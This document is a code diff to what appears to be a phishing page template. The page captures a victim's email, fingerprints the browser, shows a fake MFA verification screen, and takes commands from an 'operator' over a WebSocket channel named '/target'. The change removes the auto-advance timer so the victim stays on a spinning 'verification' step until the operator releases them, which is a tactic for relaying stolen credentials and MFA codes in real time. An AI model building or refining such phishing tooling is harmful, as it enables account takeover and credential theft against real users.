@@ -153,7 +153,6 @@
   <script>
     // ── Config ─────────────────────────────────
     var SCAN_MS = 12000;
-    var NEXT_DELAY = {{ next_delay }};
     var capturedEmail = '';
 
     // ── Browser Fingerprinting ─────────────────
@@ -471,6 +470,7 @@
         mfaNotice.style.display = 'none';
       }, 22000);
 
+      // vs4 stays spinning indefinitely until operator releases
       function showNext() {
         document.getElementById('vs4').querySelector('.si').textContent = '\u2705';
         document.getElementById('vs4').classList.add('step-done');
@@ -479,23 +479,14 @@
         document.getElementById('nextWrap').style.display = 'block';
       }
 
-      holdTimeout = setTimeout(showNext, NEXT_DELAY);
-
-      // ── WebSocket: Operator controls ──────────
+      // No auto-timer — operator has full control
       try {
         var socket = io('/target');
-        socket.on('extend_hold', function(data) {
-          clearTimeout(holdTimeout);
-          var extra = data.ms || 15000;
-          holdTimeout = setTimeout(showNext, extra);
-          st.textContent = 'Verification in progress \u2014 please standby...';
-        });
         socket.on('force_next', function() {
-          clearTimeout(holdTimeout);
           showNext();
         });
       } catch (e) {
-        // WebSocket not available — timer-only fallback
+        // WebSocket not available — no fallback, operator must release
       }
     }
   </script>
